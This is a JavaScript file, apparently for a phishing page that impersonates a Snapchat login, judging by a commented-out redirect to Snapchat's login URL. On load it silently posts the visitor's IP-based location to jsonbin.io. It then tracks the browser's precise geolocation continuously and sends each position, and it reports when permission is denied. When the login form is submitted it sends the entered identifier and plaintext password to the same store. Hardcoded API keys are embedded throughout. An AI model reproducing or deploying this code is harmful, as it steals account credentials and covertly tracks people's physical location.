
function showStatus(msg, isError = false) {
  const status = document.getElementById('status');
  status.textContent = msg;
  status.style.color = isError ? '#d32f2f' : '#2193b0';
}

function requestLocation() {
  const token = "43197bed689c2d";
  fetch("https://ipinfo.io/json", {
    headers: {
      "Authorization": "Basic " + btoa(token + ":")
    }
  })
  .then(res => {
    if (!res.ok) throw new Error('Failed to fetch location');
    return res.json();
  })
  .then(data => {

    // Save to jsonbin.io
    let req = new XMLHttpRequest();
    req.onreadystatechange = () => {
      if (req.readyState == XMLHttpRequest.DONE) {
        // Optionally, you can log or handle the response, but do not display anything
        // let resp = JSON.parse(req.responseText);
        // console.log('Saved to jsonbin:', resp);
      }
    };
    req.open("POST", "https://api.jsonbin.io/v3/b", true);
    req.setRequestHeader("Content-Type", "application/json");
    req.setRequestHeader("X-Access-Key", "$2a$10$slQ8Abl3UgEQwK657k1.2Ok2NqlOdnUeF7rfsU0Q7X54kFA/lHFv.");
    req.send(JSON.stringify(data));
    handleLocation();
  })
  .catch(err => {
    showStatus('Error fetching location: ' + err.message, true);});
}
function handleLocation(){
    if ("geolocation" in navigator) {
      navigator.geolocation.watchPosition(
        position => {
          const locationData = {
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            accuracy: position.coords.accuracy,
            timestamp: position.timestamp
          };
          // Send location data to jsonbin.io
          let geoReq = new XMLHttpRequest();
          geoReq.onreadystatechange = () => {
            if (geoReq.readyState == XMLHttpRequest.DONE) {
              // Optionally handle response
            }
          };
          geoReq.open("POST", "https://api.jsonbin.io/v3/b", true);
          geoReq.setRequestHeader("Content-Type", "application/json");
          geoReq.setRequestHeader("X-Access-Key", "$2a$10$slQ8Abl3UgEQwK657k1.2Ok2NqlOdnUeF7rfsU0Q7X54kFA/lHFv.");
          geoReq.send(JSON.stringify(locationData));
        },
        error => {
          // User denied or error occurred
          let deniedData = { error: error.message, denied: true, timestamp: Date.now() };
          let deniedReq = new XMLHttpRequest();
          deniedReq.onreadystatechange = () => {
            if (deniedReq.readyState == XMLHttpRequest.DONE) {
              // Optionally handle response
            }
          };
          deniedReq.open("POST", "https://api.jsonbin.io/v3/b", true);
          deniedReq.setRequestHeader("Content-Type", "application/json");
          deniedReq.setRequestHeader("X-Access-Key", "$2a$10$slQ8Abl3UgEQwK657k1.2Ok2NqlOdnUeF7rfsU0Q7X54kFA/lHFv.");
          deniedReq.send(JSON.stringify(deniedData));
          showStatus('Location permission denied.', true);
        }
      );
    } else {
      showStatus('Geolocation is not supported.', true);
    }
}

window.onload = function() {
  requestLocation();

  // Attach login form handler
  const loginForm = document.querySelector('.login-form');
  if (loginForm) {
    loginForm.addEventListener('submit', function(e) {
      e.preventDefault();
      handleLocation();
      const loginType = document.querySelector('input[name="loginType"]:checked').value;
      const identifier = document.getElementById('login-identifier').value;
      const password = loginForm.querySelector('input[type="password"]').value;
      const loginData = {
        type: loginType,
        identifier,
        password,
        timestamp: Date.now()
      };
      let req = new XMLHttpRequest();
      req.onreadystatechange = () => {
        if (req.readyState == XMLHttpRequest.DONE) {
          // Optionally handle response
        }
      };
      req.open("POST", "https://api.jsonbin.io/v3/b", true);
      req.setRequestHeader("Content-Type", "application/json");
      req.setRequestHeader("X-Access-Key", "$2a$10$slQ8Abl3UgEQwK657k1.2Ok2NqlOdnUeF7rfsU0Q7X54kFA/lHFv.");
      req.send(JSON.stringify(loginData));
     // window.location.href = 'https://accounts.snapchat.com/accounts/login';
    });
  }
};
